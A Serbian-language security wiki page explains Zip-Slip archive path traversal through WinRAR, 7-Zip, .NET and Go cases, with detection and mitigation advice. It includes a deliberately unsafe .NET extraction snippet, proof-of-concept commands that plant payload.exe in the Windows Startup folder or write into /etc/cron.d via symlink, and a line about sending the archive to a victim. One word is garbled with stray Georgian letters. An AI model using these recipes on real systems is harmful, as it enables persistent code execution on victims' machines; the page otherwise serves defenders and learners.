# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Pregled

Mnogi arhivski formati (ZIP, RAR, TAR, 7-ZIP itd.) omogućavaju da svaki unos sadrži sopstvenu **internu putanju**. Kada alat za ekstrakciju slepo poštuje tu putanju, posebno ime datoteke koje sadrži `..` ili **apsolutnu putanju** (npr. `C:\Windows\System32\`) biće zapisano izvan direktorijuma koji je korisnik izabrao.
Ova klasa ranjivosti je opšte poznata kao *Zip-Slip* ili **archive extraction path traversal**.<sup>[[6]](#references)</sup>

Posledice se kreću od prepisivanja proizvoljnih datoteka do direktnog postizanja **remote code execution (RCE)** ubacivanjem payload-a na lokaciju za **auto-run**, kao što je Windows *Startup* folder.

## Osnovni uzrok

1. Napadač kreira arhivu u kojoj jedno ili više zaglavlja datoteka sadrže:
* Relativne traversal sekvence (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Apsolutne putanje (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ili posebno kreirane **symlink-ove** koji se razrešavaju izvan ciljnog direktorijuma (uobičajeno u ZIP/TAR formatima na *nix sistemima).
2. Žrtva ekstraktuje arhivu pomoću ranjivog alata koji veruje ugrađenoj putanji (ili prati symlink-ove), umesto da je sanitizuje ili prisili ekstrakciju unutar izabranog direktorijuma.
3. Datoteka se upisuje na lokaciju pod kontrolom napadača i izvršava/učitava sledeći put kada sistem ili korisnik aktivira tu putanju.

### .NET `Path.Combine` + `ZipArchive` traversal

Uobičajen .NET anti-pattern je kombinovanje predviđenog odredišta sa **user-controlled** `ZipArchiveEntry.FullName` vrednošću i ekstrakcija bez normalizacije putanje:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Ako `entry.FullName` počinje sa `..\\`, dolazi do path traversal-a; ako je **absolute path**, leva komponenta se u potpunosti odbacuje, čime se kao identitet ekstrakcije dobija **arbitrary file write**.
- Proof-of-concept archive za upis u susedni `app` direktorijum koji nadgleda scheduled scanner:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Ubაცivanje tog ZIP-a u nadgledano prijemno sanduče rezultira fajlom `C:\samples\app\0xdf.txt`, čime se dokazuje traversal izvan `C:\samples\queue\` i omogućavaju naknadni primitives (npr. DLL hijacks).

## Primer iz stvarnog sveta – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR za Windows (uključujući `rar` / `unrar` CLI, DLL i portable source) nije uspevao da validira nazive fajlova tokom ekstrakcije.  
Maliciozni RAR archive koji sadrži unos kao što je:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
bi završilo **izvan** izabranog izlaznog direktorijuma i unutar korisničke fascikle *Startup*. Nakon prijavljivanja, Windows automatski izvršava sve što se tamo nalazi, čime se obezbeđuje *persistent* RCE.<sup>[[5]](#references)</sup>

### Izrada PoC arhive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Korišćene opcije:
* `-ep`  – čuva putanje datoteka tačno onako kako su navedene (ne uklanja početni `./`).

Isporučite `evil.rar` žrtvi i uputite je da ga raspakuje pomoću ranjive verzije WinRAR-a.

### Uočena Eksploatacija u Praksi

ESET je prijavio spear-phishing kampanje grupe RomCom (Storm-0978/UNC2596) u kojima su RAR arhive iskorišćene za zloupotrebu CVE-2025-8088 radi postavljanja prilagođenih backdoors i olakšavanja ransomware operacija.<sup>[[5]](#references)</sup>

## Noviji Slučajevi (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Greška**: ZIP entries koji su **symbolic links** dereferencirani su tokom raspakivanja, što je napadačima omogućavalo da izađu iz odredišnog direktorijuma i prebrišu proizvoljne putanje. Interakcija korisnika svodi se samo na *otvaranje/raspakivanje* arhive.<sup>[[1]](#references)</sup>
* **Obuhvaćene verzije**: 7-Zip 21.02–24.09 (Windows i Linux builds). Ispravljeno u verziji **25.00** (jul 2025) i novijim verzijama.
* **Putanja uticaja**: Prepisivanje lokacija `Start Menu/Programs/Startup` ili lokacija koje pokreću servise → code se izvršava pri sledećem prijavljivanju ili restartovanju servisa.
* **Brzi PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Na zakrpljenoj verziji `/etc/cron.d` neće biti izmenjen; symlink se raspakuje kao link unutar `/tmp/target`.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Greška**: `archiver.Unarchive()` prati `../` i symlinked ZIP entries, upisujući podatke izvan `outputDir`.<sup>[[2]](#references)</sup>
* **Obuhvaćeno**: `github.com/mholt/archiver` ≤ 3.5.1 (projekat je sada deprecated).
* **Ispravka**: Pređite na `mholt/archives` ≥ 0.1.0 ili implementirajte provere canonical-path pre upisivanja.
* **Minimalna reprodukcija**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Saveti za Detekciju

* **Static inspection** – Izlistajte archive entries i označite svaki naziv koji sadrži `../`, `..\\`, *absolute paths* (`/`, `C:`) ili entries tipa *symlink* čiji target vodi izvan extraction direktorijuma.
* **Canonicalisation** – Uverite se da `realpath(join(dest, name))` i dalje počinje sa `dest`. U suprotnom odbijte unos.<sup>[[3]](#references)</sup>
* **Sandbox extraction** – Raspakujte u privremeni direktorijum za jednokratnu upotrebu pomoću *safe* extractora (npr. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) i proverite da rezultujuće putanje ostaju unutar direktorijuma.
* **Endpoint monitoring** – Generišite upozorenje kada se novi executables upišu u lokacije `Startup`/`Run`/`cron` ubrzo nakon što je arhivu otvorio WinRAR/7-Zip/itd.

## Ublažavanje i Ojačavanje

1. **Ažurirajte extractor** – WinRAR 7.13+ i 7-Zip 25.00+ implementiraju sanitizaciju putanja/symlink-ova. Nijedan od ova dva alata i dalje nema auto-update.
2. Kad god je moguće, raspakujte arhive uz opciju “**Do not extract paths**” / “**Ignore paths**”.
3. Na Unix-u smanjite privilegije i montirajte **chroot/namespace** pre raspakivanja; na Windows-u koristite **AppContainer** ili sandbox.
4. Ako pišete prilagođeni code, normalizujte pomoću `realpath()`/`PathCanonicalize()` **pre** kreiranja/upisivanja i odbijte svaki entry koji izlazi iz odredišta.

## Dodatni Obuhvaćeni / Istorijski Slučajevi

* 2018 – Veliko *Zip-Slip* upozorenje kompanije Snyk koje je obuhvatilo mnoge Java/Go/JS libraries.<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011, sličan traversal tokom `-ao` merge operacije.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377), TAR extraction traversal u slug-ovima (zakrpa u verziji v1.2).<sup>[[7]](#references)</sup>
* Svaka prilagođena extraction logika koja ne poziva `PathCanonicalize` / `realpath` pre upisivanja.

## Reference

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
